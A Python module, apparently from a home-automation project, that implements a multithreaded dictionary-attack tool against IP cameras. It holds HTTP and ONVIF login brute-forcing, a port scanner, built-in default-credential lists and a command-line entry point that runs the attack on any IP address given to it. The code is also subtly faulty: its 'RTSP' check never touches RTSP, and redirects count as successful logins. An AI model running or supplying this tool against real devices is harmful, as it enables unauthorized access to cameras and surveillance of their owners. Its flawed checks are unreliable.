"""
Security testing module for camera devices.
Provides dictionary attack capabilities for penetration testing.
"""
import requests
import time
import threading
import socket
from typing import Dict, Any, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from homeauto.utils.logging_config import get_device_logger


class CameraSecurityTester:
    """Security testing tools for IP cameras"""
    
    def __init__(self, ip: str, port: int = 80):
        self.ip = ip
        self.port = port
        self.base_url = f"http://{ip}:{port}"
        self.logger = get_device_logger("security", ip)
        self.timeout = 3
        self.max_workers = 10  # Concurrent threads for attacks
        
    def test_http_auth(self, username: str, password: str, endpoint: str = "/") -> bool:
        """Test HTTP Basic Authentication"""
        try:
            response = requests.get(
                f"{self.base_url}{endpoint}",
                auth=(username, password),
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Check for successful authentication
            if response.status_code == 200:
                self.logger.info(f"Valid credentials found: {username}:{password}")
                return True
            elif response.status_code == 401:
                return False
            elif response.status_code == 302 or response.status_code == 301:
                # Redirect might indicate successful login
                self.logger.info(f"Possible valid credentials (redirect): {username}:{password}")
                return True
                
        except requests.exceptions.RequestException as e:
            self.logger.debug(f"Request failed for {username}:{password}: {e}")
            
        return False
    
    def test_rtsp_auth(self, username: str, password: str) -> bool:
        """Test RTSP stream authentication"""
        try:
            # Try to connect to RTSP stream
            rtsp_url = f"rtsp://{username}:{password}@{self.ip}:554/stream1"
            
            # Use requests with RTSP-like approach (simplified)
            response = requests.get(
                f"{self.base_url}/onvif/device_service",
                auth=(username, password),
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                self.logger.info(f"RTSP credentials found: {username}:{password}")
                return True
                
        except Exception as e:
            self.logger.debug(f"RTSP test failed for {username}:{password}: {e}")
            
        return False
    
    def test_onvif_auth(self, username: str, password: str) -> bool:
        """Test ONVIF authentication"""
        try:
            # ONVIF GetDeviceInformation request
            soap_request = f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:wsdl="http://www.onvif.org/ver10/device/wsdl">
    <soap:Header/>
    <soap:Body>
        <wsdl:GetDeviceInformation/>
    </soap:Body>
</soap:Envelope>'''
            
            headers = {
                'Content-Type': 'application/soap+xml; charset=utf-8',
                'User-Agent': 'HomeAuto Security Tester'
            }
            
            response = requests.post(
                f"{self.base_url}/onvif/device_service",
                data=soap_request,
                auth=(username, password),
                headers=headers,
                timeout=self.timeout
            )
            
            if response.status_code == 200 and 'GetDeviceInformationResponse' in response.text:
                self.logger.info(f"ONVIF credentials found: {username}:{password}")
                return True
                
        except Exception as e:
            self.logger.debug(f"ONVIF test failed for {username}:{password}: {e}")
            
        return False
    
    def dictionary_attack(self, 
                         username_list: List[str],
                         password_list: List[str],
                         protocol: str = "http",
                         endpoint: str = "/") -> List[Dict[str, str]]:
        """
        Perform dictionary attack on camera device.
        
        Args:
            username_list: List of usernames to try
            password_list: List of passwords to try
            protocol: Authentication protocol to test (http, rtsp, onvif)
            endpoint: HTTP endpoint to test (for http protocol)
            
        Returns:
            List of valid credentials found
        """
        valid_credentials = []
        total_attempts = len(username_list) * len(password_list)
        attempts_made = 0
        
        self.logger.info(f"Starting dictionary attack on {self.ip}")
        self.logger.info(f"Protocol: {protocol}, Usernames: {len(username_list)}, Passwords: {len(password_list)}")
        
        start_time = time.time()
        
        # Select test function based on protocol
        if protocol == "rtsp":
            test_func = self.test_rtsp_auth
        elif protocol == "onvif":
            test_func = self.test_onvif_auth
        else:  # http
            test_func = lambda u, p: self.test_http_auth(u, p, endpoint)
        
        # Use ThreadPoolExecutor for concurrent testing
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for username in username_list:
                for password in password_list:
                    future = executor.submit(test_func, username, password)
                    futures.append((future, username, password))
            
            for future, username, password in futures:
                try:
                    attempts_made += 1
                    
                    # Update progress every 10 attempts
                    if attempts_made % 10 == 0:
                        progress = (attempts_made / total_attempts) * 100
                        elapsed = time.time() - start_time
                        self.logger.debug(f"Progress: {progress:.1f}% ({attempts_made}/{total_attempts}), "
                                        f"Elapsed: {elapsed:.1f}s")
                    
                    if future.result():
                        valid_credentials.append({
                            "username": username,
                            "password": password,
                            "protocol": protocol,
                            "found_at": time.time()
                        })
                        
                except Exception as e:
                    self.logger.debug(f"Test failed for {username}:{password}: {e}")
        
        elapsed_time = time.time() - start_time
        self.logger.info(f"Dictionary attack completed in {elapsed_time:.1f}s")
        self.logger.info(f"Found {len(valid_credentials)} valid credentials")
        
        return valid_credentials
    
    def load_wordlist(self, filepath: str) -> List[str]:
        """Load wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
                self.logger.info(f"Loaded {len(words)} words from {filepath}")
                return words
        except Exception as e:
            self.logger.error(f"Failed to load wordlist {filepath}: {e}")
            return []
    
    def generate_common_credentials(self) -> Tuple[List[str], List[str]]:
        """Generate common username/password combinations for cameras"""
        common_usernames = [
            "admin", "root", "user", "administrator", "supervisor",
            "camera", "security", "admin1", "admin123", "adminadmin"
        ]
        
        common_passwords = [
            "", "admin", "123456", "password", "12345678", "123456789",
            "1234", "12345", "111111", "admin123", "adminadmin",
            "password123", "camera", "security", "1234567890",
            "000000", "888888", "123123", "654321", "11111111"
        ]
        
        return common_usernames, common_passwords
    
    def test_default_credentials(self) -> List[Dict[str, str]]:
        """Test common default credentials"""
        self.logger.info("Testing default credentials")
        
        usernames, passwords = self.generate_common_credentials()
        
        # Test all protocols
        valid_credentials = []
        
        for protocol in ["http", "rtsp", "onvif"]:
            self.logger.info(f"Testing {protocol} protocol with default credentials")
            credentials = self.dictionary_attack(
                usernames, passwords, protocol, "/"
            )
            valid_credentials.extend(credentials)
            
            if credentials:
                self.logger.warning(f"Found default credentials for {protocol}: {credentials}")
        
        return valid_credentials
    
    def scan_open_ports(self) -> Dict[int, str]:
        """Scan for open ports on camera device"""
        common_ports = {
            80: "HTTP",
            443: "HTTPS",
            554: "RTSP",
            8000: "HTTP Alt",
            8080: "HTTP Proxy",
            37777: "Dahua",
            34567: "Hikvision",
            8899: "ONVIF",
            8008: "Streaming",
            9000: "API"
        }
        
        open_ports = {}
        
        for port, service in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.ip, port))
                sock.close()
                
                if result == 0:
                    open_ports[port] = service
                    self.logger.info(f"Open port found: {port} ({service})")
                    
            except Exception as e:
                self.logger.debug(f"Port scan failed for {port}: {e}")
        
        return open_ports
    
    def get_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        self.logger.info(f"Generating security report for {self.ip}")
        
        report = {
            "target": self.ip,
            "timestamp": time.time(),
            "open_ports": self.scan_open_ports(),
            "default_credentials_test": self.test_default_credentials(),
            "recommendations": []
        }
        
        # Generate recommendations
        if report["default_credentials_test"]:
            report["recommendations"].append(
                "Change default credentials immediately"
            )
            report["security_level"] = "CRITICAL"
        elif report["open_ports"]:
            report["security_level"] = "MEDIUM"
            report["recommendations"].append(
                "Restrict open ports to necessary services only"
            )
        else:
            report["security_level"] = "LOW"
        
        # Check for HTTP without HTTPS
        if 80 in report["open_ports"] and 443 not in report["open_ports"]:
            report["recommendations"].append(
                "Enable HTTPS for secure communication"
            )
        
        self.logger.info(f"Security report generated: {report['security_level']}")
        return report


# CLI command for dictionary attacks
def camera_bruteforce_command(ip: str, 
                             username_file: str = None,
                             password_file: str = None,
                             protocol: str = "http",
                             endpoint: str = "/",
                             max_workers: int = 10) -> None:
    """
    CLI command to perform dictionary attack on camera.
    
    Usage:
        python -m homeauto.devices.security camera_bruteforce_command <ip> [options]
    """
    import argparse
    import sys
    
    parser = argparse.ArgumentParser(description="Camera dictionary attack tool")
    parser.add_argument("ip", help="Target camera IP address")
    parser.add_argument("--username-file", help="File containing usernames (one per line)")
    parser.add_argument("--password-file", help="File containing passwords (one per line)")
    parser.add_argument("--protocol", choices=["http", "rtsp", "onvif"], 
                       default="http", help="Authentication protocol")
    parser.add_argument("--endpoint", default="/", help="HTTP endpoint to test")
    parser.add_argument("--workers", type=int, default=10, 
                       help="Number of concurrent workers")
    parser.add_argument("--default-only", action="store_true",
                       help="Only test default credentials")
    
    args = parser.parse_args()
    
    tester = CameraSecurityTester(args.ip)
    tester.max_workers = args.workers
    
    if args.default_only:
        print(f"Testing default credentials on {args.ip}...")
        credentials = tester.test_default_credentials()
        
        if credentials:
            print(f"\n⚠️  DEFAULT CREDENTIALS FOUND:")
            for cred in credentials:
                print(f"  - {cred['username']}:{cred['password']} ({cred['protocol']})")
        else:
            print("No default credentials found.")
            
    else:
        # Load wordlists
        if args.username_file:
            usernames = tester.load_wordlist(args.username_file)
        else:
            usernames = tester.generate_common_credentials()[0]
            
        if args.password_file:
            passwords = tester.load_wordlist(args.password_file)
        else:
            passwords = tester.generate_common_credentials()[1]
        
        print(f"Starting dictionary attack on {args.ip}")
        print(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}")
        print(f"Total combinations: {len(usernames) * len(passwords)}")
        print(f"Protocol: {args.protocol}")
        print("-" * 50)
        
        credentials = tester.dictionary_attack(
            usernames, passwords, args.protocol, args.endpoint
        )
        
        if credentials:
            print(f"\n✅ VALID CREDENTIALS FOUND:")
            for cred in credentials:
                print(f"  - {cred['username']}:{cred['password']}")
        else:
            print("\n❌ No valid credentials found.")
    
    # Generate security report
    print("\n" + "=" * 50)
    print("SECURITY REPORT")
    print("=" * 50)
    report = tester.get_security_report()
    
    print(f"Target: {report['target']}")
    print(f"Security Level: {report['security_level']}")
    print(f"Open Ports: {len(report['open_ports'])}")
    
    for port, service in report['open_ports'].items():
        print(f"  - {port}: {service}")
    
    if report['recommendations']:
        print("\nRecommendations:")
        for rec in report['recommendations']:
            print(f"  - {rec}")


if __name__ == "__main__":
    # Allow direct execution for testing
    import sys
    camera_bruteforce_command(sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100")
